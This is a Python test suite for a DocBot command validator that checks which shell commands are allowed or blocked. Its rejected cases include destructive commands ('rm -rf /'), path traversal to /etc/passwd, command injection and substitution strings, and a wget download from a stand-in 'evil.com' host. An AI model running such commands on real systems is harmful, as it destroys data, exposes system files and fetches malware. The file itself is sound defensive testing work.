#!/usr/bin/env python3
"""Security test suite for DocBot command validator"""

from app.security import CommandValidator


def test_security():
    """Run security validation tests"""
    
    # Test cases: (command, should_pass, description)
    test_cases = [
        # Valid commands
        ("ls -la", True, "Basic ls command"),
        ("cat sample.txt", True, "Read file"),
        ("grep -r 'pattern' .", True, "Search in files"),
        ("find . -name '*.txt'", True, "Find files"),
        ("head -n 10 file.log", True, "Read first lines"),
        ("tail -f access.log", True, "Follow log file"),
        ("awk '{print $1}' data.csv", True, "Process CSV"),
        ("sort names.txt | uniq", False, "Pipe not allowed"),
        
        # Invalid - file modifications
        ("rm file.txt", False, "Delete file"),
        ("rm -rf /", False, "Dangerous rm"),
        ("touch newfile.txt", False, "Create file"),
        ("echo 'data' > file.txt", False, "Write to file"),
        ("cat file.txt > copy.txt", False, "Output redirect"),
        ("sed -i 's/old/new/' file.txt", False, "In-place edit"),
        
        # Invalid - path traversal
        ("cat ../../../etc/passwd", False, "Path traversal"),
        ("ls /etc/", False, "Access outside workspace"),
        ("find /home -name secret", False, "Search outside workspace"),
        
        # Invalid - command injection
        ("ls; rm -rf /", False, "Command chaining"),
        ("cat `whoami`", False, "Command substitution"),
        ("grep pattern $(ls)", False, "Command substitution"),
        ("ls && echo done", False, "Conditional execution"),
        
        # Invalid - dangerous find options
        ("find . -exec rm {} \\;", False, "Find with exec"),
        ("find . -delete", False, "Find with delete"),
        
        # Invalid - network operations
        ("wget http://evil.com/malware", False, "Download file"),
        ("curl -X POST http://api.com", False, "HTTP request"),
        
        # Edge cases
        ("", False, "Empty command"),
        ("   ", False, "Whitespace only"),
        ("a" * 1000, False, "Very long command"),
    ]
    
    print("🔒 DocBot Security Validation Tests\n")
    
    passed = 0
    failed = 0
    
    for command, should_pass, description in test_cases:
        is_valid, message = CommandValidator.validate_command(command)
        
        # For display, truncate long commands
        display_cmd = command if len(command) < 50 else command[:47] + "..."
        
        if is_valid == should_pass:
            print(f"✅ PASS: {description}")
            print(f"   Command: {display_cmd}")
            print(f"   Result: {message}\n")
            passed += 1
        else:
            print(f"❌ FAIL: {description}")
            print(f"   Command: {display_cmd}")
            print(f"   Expected: {'Valid' if should_pass else 'Invalid'}")
            print(f"   Got: {'Valid' if is_valid else 'Invalid'}")
            print(f"   Message: {message}\n")
            failed += 1
    
    print(f"\nTest Summary: {passed} passed, {failed} failed")
    return failed == 0


if __name__ == "__main__":
    success = test_security()
    exit(0 if success else 1)